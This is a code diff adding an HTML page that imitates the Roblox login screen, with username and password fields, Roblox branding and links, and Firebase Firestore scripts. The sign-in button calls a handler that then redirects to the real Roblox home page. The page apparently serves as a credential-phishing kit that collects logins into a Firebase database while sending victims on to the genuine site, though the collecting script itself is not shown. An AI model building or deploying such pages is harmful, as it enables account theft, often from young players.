@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Login</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+</head>
+<body>
+    <div class="logo-container">
+        <img src="roblox.png" alt="Roblox Logo" class="logo">
+    </div>
+    
+    <div class="container">
+        
+        <form id="LoginForm" action="" method="post">
+            <div class="input-group">
+                <input type="text" id="username" name="username" placeholder="Username/Email/Phone" required>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit" onclick="submitAndRedirect(event, 'https://www.roblox.com/home')" class="login-btn">Sign In</button>
+        </form>
+        
+        <div class="other-options">
+            <button class="option-btn">Email Me a One-Time Code</button>
+            <button class="option-btn">Quick Sign-In</button>
+            <a href="https://www.roblox.com/login/forgot-password-or-username" class="forgot-password">Forgot Password or Username?</a>
+        </div>
+        
+        <div class="terms">
+            <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" target="_blank">Terms</a>
+            <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-and-Cookie-Policy" target="_blank">Privacy</a>
+        </div>
+    </div>
+    <script src="firebase.js"></script>
+</body>
+</html>
